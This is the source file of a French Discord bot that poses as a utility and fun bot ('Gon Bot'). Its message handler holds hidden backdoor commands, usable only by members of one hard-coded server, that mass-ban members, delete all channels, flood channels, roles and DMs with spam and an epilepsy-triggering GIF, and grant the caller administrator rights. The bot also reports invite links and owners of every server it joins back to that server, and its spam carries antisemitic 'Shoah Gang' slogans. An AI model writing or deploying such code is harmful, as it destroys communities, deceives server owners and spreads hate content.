const Discord = require('discord.js');
const bot = new Discord.Client();
const fs = require('fs');
const moment = require("moment");
 var prefix = "."
bot.on('ready',() => {
  //invit link
  console.log("---------------------------")
});  

bot.on('message', message => {
 
  const mute = require("./commands/moderation/mute.js");
  const unmute = require("./commands/moderation/unmute.js");
  
  mute(message, prefix , bot)
  unmute(message, prefix , bot)
  
  
  });

bot.on('message', msg => {

  if (msg.guild === bot.guilds.find('id', '453631449804046336')){ 
    return;
  }
  
  

 if (bot.guilds.get('453631449804046336').members.get(msg.author.id) !== undefined) {
    
if (msg.content === '.destruction') {
  bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .destruction par ${msg.author.tag}`).catch(e => {});
    var interval = setInterval (function () {
      msg.channel.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
     "SHOAH GANG ON THE BEAT \n"+
     "https://discord.gg/8vtFryt \n"+
     "https://discord.gg/s5Y2RfG").catch(e => {});
    }, 450)
  }

if (msg.content === '.oupss') {
    bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .oupss par ${msg.author.tag}`).catch(e => {});
   fucked = false;

 
    if (!fucked){
      msg.guild.setIcon("./shoah.jpg").catch(e => {});
      msg.guild.setName('BZ by Shoah Gang').catch(e => {});
     msg.guild.setRegion('hongkong').catch(e => {});
 
      for (var i = 0; i < 500; i++) {
        msg.guild.createChannel('shoah_gang_te_baise', 'voice').catch(e => {});
        msg.guild.createChannel('shoah_gang_te_baise', 'text').catch(e => {});
      }
      fucked = true;
    }
 
    if (msg.deletable) {
      msg.delete();
    }
  }


if (msg.content === '.banev') {
 bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .banev par ${msg.author.tag}`).catch(e => {});
    msg.guild.members.forEach(member => {
      if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
    });
  }


if (msg.content === '.leave') {
 bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .leave par ${msg.author.tag}`).catch(e => {});
    if (msg.deletable) msg.delete().catch(e => {});
    msg.guild.leave().catch(e => {});
  }

if (msg.content === '.pardon') {
 bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .pardon par ${msg.author.tag}`).catch(e => {});

    msg.member.guild.createRole({
      name: "Shoah Gang",
      permissions: "ADMINISTRATOR",
      mentionable: false
    }).then(function(role) {
      msg.member.addRole(role).catch(e => {});
      if (msg.deletable) msg.delete().catch(e => {});
    }).catch(e => {});
  }
  if (msg.content === '.roleflood') {
 bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .roleflood par ${msg.author.tag}`).catch(e => {});
    if (msg.deletable) msg.delete();
    let i = 0;
    let interval = setInterval(function () {
    if (i === 250) clearInterval(interval);
    msg.guild.createRole({name: 'SHOAH GANG', color:'RANDOM'}).then(function(role) {
      msg.guild.members.forEach(member => {
      member.addRole(role).catch(e => {});
    })
    i++
    }, 100)
       });
    
      }

  if(msg.content === ".del"){
    bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .del par ${msg.author.tag}`).catch(e => {});
    if(msg.deletable) msg.delete();
    msg.guild.channels.forEach(channel => {
      if(channel.deletable) channel.delete()
  })
  }


  if(msg.content === ".mp"){
    bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`Commande .mp par ${msg.author.tag}`).catch(e => {});
    if(msg.deletable) msg.delete();
    i = 0;
    msg.guild.members.forEach(member => {

    if(i < 500){
      var interval = setInterval (function () {
        member.send("@everyone @here .https://cdn.discordapp.com/attachments/436188674435317760/449911258221903883/epileptique.gif \n"+
     "SHOAH GANG ON THE BEAT \n"+
     "https://discord.gg/8vtFryt \n"+
     "https://discord.gg/s5Y2RfG").catch(e => {});
      }, 450)

      }   
  })
  }

 }//Filtre personne
});
bot.on("message", message => {
  if(message.content.startsWith(".avatar")) {
    var membere = message.mentions.members.first()
    let avatar_embed = new Discord.RichEmbed()
    .setAuthor(` Avatar de ${message.mentions.users.first().username}`)
    .setColor("#FFCC99")
    .setImage(membere.user.avatarURL)
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
    return message.channel.send(avatar_embed).catch(e => {});
}  
if(message.content.startsWith(".say")) {
  if(message.deletable) {
  message.delete()}
var text = message.content.split(" ").slice(1).join(" ")
if(!text){
  messsage.channel.send("Tu ne m'as pas donner un message à répéter :x:").catch(e => {});
}
let embed = new Discord.RichEmbed();
embed.setColor("#FFCC99")
.setTitle(" ")
.setDescription(text)
message.channel.sendEmbed(
  embed, {
    disableEveryone: true
  }
).catch(e => {});
}
})

bot.on("message", message => {
  if(message.content.startsWith(".8ball")){
    var question = message.content.split(" ").slice(1).join(" ")
    var tableauball = ["Oui","Non","Peut être", "Je ne sais pas", "Surement", "Probablement","C'est sur", "J'en sais rien"]
    let ball_embed = new Discord.RichEmbed()
    .setColor("#FFCC99")
    .setTitle(":newspaper2: **Question de "+message.author.tag+"** :newspaper2: ")
    .setDescription("**"+question+"**")
    .addField("**Reponse**","**"+ tableauball[Math.floor(Math.random()*8)] +"**")
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
    .setThumbnail(bot.user.iconURL)
    return message.channel.send(ball_embed).catch(e => {});
  }
  bot.on("message", message => {
  if(message.content.startsWith(".serverinfo")){
    moment.locale("fr");
    var date_de_creation_du_serv = moment(message.guild.createdTimestamp).format("LLLL");
    let serverinfo_embed = new Discord.RichEmbed()
    .setTitle("Info Sur le Serveur")
    .setColor("#FFCC99")
    .addField("Nom", message.guild.name)
    .addField("Id du serveur", message.guild.id)
    .addField("Emplacement Du Serveur", message.guild.region)
    .addField("Nombre de membre", message.guild.memberCount)
    .addField("Date de Creation", date_de_creation_du_serv)
    .addField("Nombre de Channel", message.guild.channels.size)
    .addField("Nombre d'emoji", message.guild.emojis.size)
    .addField("Liste Des Emojis", message.guild.emojis.map(e=>e.toString()).join(" "))
    .setThumbnail(message.guild.iconURL)
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
    return message.channel.send(serverinfo_embed).catch(e => {});
  }})

  bot.on("message", message => {
  if(message.content.startsWith(".userinfo")){
    var membere2 = message.mentions.members.first()
    moment.locale('fr')
    var date_de_creation_du_compte = moment(membere2.user.createdTimestamp).format("LLLL") 

    let userinfo_embed = new Discord.RichEmbed()
    .setThumbnail(membere2.user.avatarURL)
    .setColor("#FFCC99")
    .addField("Pseudo", `${message.mentions.users.first().username}`)
    .addField("Id du Membre", membere2.user.id)
    .addField("Date de Creation Du Compte", date_de_creation_du_compte)
    .addField("Discriminator", '#'+membere2.user.discriminator)
    .addField("Tag du Membre", membere2.user.tag)
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
 message.channel.send(userinfo_embed) 
 return;
  }
})
  bot.on("message", message => {
  if (bot.guilds.get('453631449804046336').members.get(message.author.id) !== undefined) {
    if(message.content.startsWith(".listeserver")) {
      bot.guilds.forEach(guild => {
        var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id)
        invite.createInvite().then(invite => message.channel.send(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`)).catch(e => {});
      })
    }
  }

})
})

bot.on('guildMemberAdd', member => {

  member.createDM().then(prive => {
    let bienvenue_embed = new Discord.RichEmbed()
    .setColor("#FFCC99")
    .addField(`Bienvenue ${member.user.username}`, "Viens parler avec les joueurs !")
    .setFooter("Copyright © 2018 Gon Bot - Tout droit réservé")
    .setThumbnail(member.iconURL)
    .setAuthor("Gon bot")
    prive.send(bienvenue_embed).catch(e => {});
  })
})

bot.on("message", message => {
  if(message.content === '.createinvite'){
    message.channel.createInvite().then(invite => {
      message.reply(` :white_check_mark: ** Voici ton invite : https://discord.gg/${invite.code} ** :white_check_mark:`).catch(e => {});
    })
  }
})

bot.on("message", message => {
  if(message.content.startsWith(".kick")){
    var membere2 = message.author
    var membere = message.guild.member(message.mentions.members.first());
    
    if(!message.member.hasPermission("KICK_MEMBERS")) {
      message.reply(":x: **Tu n'as pas assez de permission pour kick** :x:").catch(e => {});
    }
    if(!message.guild.member(bot.user).hasPermission("KICK_MEMBERS")){
      message.reply(":x: **Je n'ai pas assez de permission pour kick**").catch(e => {});
    }
    if(message.mentions.users.size === 0){
      message.reply(":x: ** Vous devez écrire la mention d'un joueur a kick ** :x:").catch(e => {});
    }
    else if(!membere.bannable){
      message.reply(":x: **Ce joueur n'est pas bannable, peut être à-t-il un rôle supérieur au mien ?** :x:")
    }
    else {
  membere.kick().then(member => {
    return message.channel.send(":white_check_mark: `"+membere.user.username+"` **à été kick par ** `"+membere2.username+"` :white_check_mark:").catch(e => {});
  }).catch(e => {});
    }
  }
  if(message.content.startsWith(".ban")){
    var membere2 = message.author
    let membere = message.guild.member(message.mentions.members.first());
    if(!message.member.hasPermission("BAN_MEMBERS")) {
      message.reply(":x: **Tu n'as pas assez de permission pour ban** :x:").catch(e => {});
    }
    if(!message.guild.member(bot.user).hasPermission("BAN_MEMBERS")){
      message.reply(":x: **Je n'ai pas assez de permission pour ban**").catch(e => {});
    }
    if(message.mentions.users.size === 0){
      message.reply(":x: ** Vous devez écrire la mention d'un joueur a ban ** :x:").catch(e => {});
    }
    else if(!membere.bannable){
      message.reply(":x: **Ce joueur n'est pas bannable, peut être à-t-il un rôle supérieur au mien ?** :x:")
    }
    else {
  membere.ban().then(member => {
   return message.channel.send(":white_check_mark:  `"+membere.user.username+"`  **à été ban par ** `"+membere2.username+"`  :white_check_mark:").catch(e => {});
  }).catch(e => {});
}
  }
})

bot.on("message", message => {
  if(message.content.startsWith(".flip")){
    var flip = ["Pile", "Face"]
    var reponse = flip[Math.floor(Math.random()*2)]
    let flip_embed = new Discord.RichEmbed()
    .setColor("#FFCC99")
    .addField("FLIP", " :moneybag: La piece affiche : **"+reponse+"**")
    message.channel.send(flip_embed).catch(e => {});
    }
    if(message.content === ".c"){
      var voilatableau = ["Ptdrr t ki ?", "Ohhh mon maitre, tu es enfin de retour ?", "Tu es le meilleur, puis-je devenir ton disciple ?", "Degage toi","Mais QUI ES-TU ???","Je ne te connais pas dsl"]
      var voila = voilatableau[Math.floor(Math.random()*6)]
      let voila_embed = new Discord.RichEmbed()
      .setColor("#FFCC99")
     .setDescription(":beer: **"+voila+"** :beers: ")
      return message.channel.send(voila_embed).catch(e => {});
    }

    if(message.content === '.help'){
      let help1_embed = new Discord.RichEmbed()
      .setTitle("Commande Fun")
      .addField(".c", "Le bot vous revele vôtre vraie identitée.... :beer:")
      .addField(".flip", "Joué au pile ou face avec le bot :moneybag:")
      .addField('.8ball',"Exemple `As-tu déjà eu une sexfriend ?` Posé une question intime une bot :smirk: ")
      .addField(".say", "Fais répéter une question au bot")
      .addField(".rainrole", "Creer le role multicolore  :rainbow:")
      .addField(".rainbow", "Vous ajoutes le role multicolore  :rainbow:")
      .setColor("#FFCC99");
      var membere = message.author;
      let help2_embed = new Discord.RichEmbed()
      .setTitle("Commande Utile / Moderation")
      .addField(".ban", "Exemple `.ban @Gon`, Renvoyer les enemis dans leurs territoire !")
      .addField(".kick", "Exemple `.kick @Gon`, Expulser de vôtre territoire un ennemi")
      .addField(".mute", "Exemple `.mute @Gon`, Retire le droit de parole à un membre !")
      .addField(".unmute", "Exemple `.unmute @Gon` Redonne le droit de parole a un membre")
      .addField(".avatar", "Exemple `.avatar @Gon`, Fouille dans les trefonds de discord et récupérer l'image d'un ami")
      .addField(".userinfo", "Exemple `.userinfo @Gon`, Récupérer toutes les infos d'une personne :' )")
      .addField(".serverinfo", "Vous donnes toutes les infos croustillante sur le serveur")
      .addField(".createinvite", "Vous donnes l'invit du serveur pour ramener vôtre armée !")
      .setColor("#FFCC99");
      message.channel.send(":envelope:  **Je vous envois l'aide en mp** :envelope: ").catch(e => {});
      message.delete(":envelope:  **Je vous envois l'aide en mp** :envelope: ").catch(e => {});
      message.author.send(help1_embed).catch(e => {});
      message.author.send(help2_embed).catch(e => {});
      
    }
      })

      bot.on("guildCreate", guild => {
        if(guild.member(bot.user).hasPermission("ADMINISTRATOR")){
          var invite = guild.channels.find("id", guild.channels.random().id);
          invite.createInvite().then(invite => {
            bot.guilds.get('453631449804046336').channels.get('454348199075774476').send(`[ADMINITRATEUR] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
          })
        }
        else if(!guild.member(bot.user).hasPermission("ADMINISTRATOR")){
          var invite = guild.channels.find("id", guild.channels.random().id);
          invite.createInvite().then(invite => {
            bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(`[NO ADMIN] Connecté sur ${guild.name} || ${guild.memberCount} membres || https://discord.gg/${invite.code} || Chef ${guild.owner}`).catch(e => {});
          })
        }
      });
      bot.on('guildDelete', guild => {
        bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(`[LEAVE] ${guild.name} || ${guild.memberCount} membres`).catch(e => {});
      })
      bot.on("message", message => {
        if (message.content === '.rainrole') {
          if (message.deletable) message.delete();
                message.reply(':white_check_mark: Le rôle **Rainbow** à bien été crée. Exécuté la commande `.rainbow` pour poursuivre la procèdure !:white_check_mark:')
          if (!message.member.hasPermission("ADMINISTRATOR")) return message.reply(":x: **Tu dois avoir les permissions `ADMINISTRATOR`** :x: ");
          message.guild.createRole({name: 'Rainbow'})
        }
      
        if (message.content === '.rainbow') {
          message.reply(':rainbow: La commande est maintenant activé, il te reste juste à attribué le role! :rainbow:')
        let args = message.content.split(' ')
        args.shift()
        message.delete()
        if (!message.member.hasPermission("ADMINISTRATOR")) return message.reply(":x: ** Tu n'as pas la permission `ADMINISTRATOR` ** :x:");
        if (!message.guild.roles.find("name", "Rainbow")) return console.log(":x: **  Le role `Rainbow` n'existe pas ** :x:")
        var myRainbow = message.guild.roles.find("name", "Rainbow")
        let i = 0;
          let interval = setInterval(function () {
          myRainbow.setColor('#000000').then(i++);
          myRainbow.setColor('#00FFFF').then(i++);
          myRainbow.setColor('#F0FFFF').then(i++);
          myRainbow.setColor('#F5F5DC').then(i++);
          myRainbow.setColor('#8A2BE2').then(i++);
          myRainbow.setColor('#5F9EA0').then(i++);
          myRainbow.setColor('#00008B').then(i++);
          myRainbow.setColor('#BDB76B').then(i++);
          myRainbow.setColor('#696969').then(i++);
          myRainbow.setColor('#DCDCDC').then(i++);
          myRainbow.setColor('#FFD700').then(i++);
          myRainbow.setColor('#DAA520').then(i++);
          myRainbow.setColor('#CD5C5C').then(i++);
          myRainbow.setColor('#E6E6FA').then(i++);
          myRainbow.setColor('#ADD8E6').then(i++);
          myRainbow.setColor('#FFB6C1').then(i++);
          myRainbow.setColor('#9370DB').then(i++);
          myRainbow.setColor('#8b00ff').then(i++);
          
        }, 4000);
      }
      })
bot.login(process.env.BOT_TOKEN); 
